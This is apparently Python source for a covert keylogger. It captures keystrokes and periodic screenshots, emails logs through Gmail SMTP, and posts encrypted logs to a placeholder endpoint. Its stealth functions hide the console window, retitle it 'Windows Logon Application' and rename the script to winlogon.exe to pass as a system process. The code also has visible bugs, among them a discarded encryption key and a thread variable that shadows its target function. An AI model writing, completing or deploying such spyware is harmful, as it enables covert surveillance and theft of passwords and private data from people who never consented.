import pynput.keyboard
import datetime
import os
import smtplib
import threading
import configparser
import hashlib
import pyscreenshot
import time
from cryptography.fernet import Fernet
import requests
import ctypes

# Load configuration from external file
config = configparser.ConfigParser()
config.read("config.ini")  # Create config.ini file and add necessary settings

log_file = config.get("Keylogger", "log_file")
log_to_email = config.getboolean("Keylogger", "log_to_email")
email_address = config.get("Keylogger", "email_address")
email_password = config.get("Keylogger", "email_password")
screenshot_interval = config.getint("Keylogger", "screenshot_interval")  # Interval in seconds

# Check log size and rotate if needed
MAX_LOG_SIZE = 1024 * 1024  # 1 MB
if os.path.isfile(log_file) and os.path.getsize(log_file) >= MAX_LOG_SIZE:
    backup_file = log_file + ".bak"
    if os.path.isfile(backup_file):
        os.remove(backup_file)
    os.rename(log_file, backup_file)

def on_press(key):
    global log
    try:
        log += key.char
        print(key.char)  # Print the key that was pressed for debugging
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        else:
            log += f" [{str(key)}] "

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

def save_log(log_data):
    with open(log_file, "a") as file:
        file.write(log_data)

def send_email():
    if not log_to_email:
        return

    with open(log_file, "r") as file:
        log_data = file.read()

    # Encrypt log_data before sending
    encryption_key = generate_key()
    encrypted_data = encrypt_data(log_data, encryption_key)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email_address, email_password)
    server.sendmail(email_address, email_address, encrypted_data)
    server.quit()

def generate_key():
    return Fernet.generate_key()

def encrypt_data(data, key):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())
    return encrypted_data

def decrypt_data(encrypted_data, key):
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    return decrypted_data.decode()

def hide_console_window():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def hide_from_task_manager():
    ctypes.windll.kernel32.SetConsoleTitleW("Windows Logon Application")

def hide_from_autostart():
    current_script_name = os.path.basename(__file__)
    new_script_name = os.path.join(os.path.dirname(__file__), "winlogon.exe")
    os.rename(__file__, new_script_name)

def remove_from_taskbar():
    # Minimize the window to hide it from the taskbar
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)

def take_screenshot():
    screenshot = pyscreenshot.grab()
    screenshot_path = os.path.join(os.getcwd(), f"screenshot_{int(time.time())}.png")
    screenshot.save(screenshot_path)
    return screenshot_path

def network_communication():
    global log

    # Load the log file data
    with open(log_file, "rb") as file:
        log_data = file.read()

    # Encrypt log_data before sending
    encryption_key = generate_key()
    encrypted_data = encrypt_data(log_data, encryption_key)

    # Create a dictionary with the encrypted data
    data_to_send = {
        "log_data": encrypted_data
    }

    # Replace 'https://example.com/endpoint' with the actual server URL
    url = "https://example.com/endpoint"

    try:
        response = requests.post(url, json=data_to_send, timeout=5)

        if response.status_code == 200:
            print("Log data sent successfully!")
        else:
            print("Failed to send log data!")
    except requests.exceptions.RequestException as e:
        print("Error:", e)

def stealth_mode():
    # Hide the console window
    hide_console_window()

    # Additional stealth mode techniques
    hide_from_task_manager()
    hide_from_autostart()
    remove_from_taskbar()

def cleanup():
    # Add any cleanup code here, if needed
    pass

def screenshot_thread():
    while True:
        screenshot_path = take_screenshot()
        print(f"Screenshot taken: {screenshot_path}")
        time.sleep(screenshot_interval)

def main():
    global log

    # Initialize the keylogger
    log = ""
    keyboard_listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
    keyboard_listener.start()

    # Start the network communication thread
    network_thread = threading.Thread(target=network_communication)
    network_thread.start()

    # Start the screenshot thread
    screenshot_thread = threading.Thread(target=screenshot_thread)
    screenshot_thread.start()

    try:
        stealth_mode()
    except KeyboardInterrupt:
        # Stop the keylogger when the user presses Ctrl+C
        keyboard_listener.stop()
        network_thread.join()
        screenshot_thread.join()
        cleanup()

if __name__ == "__main__":
    main()
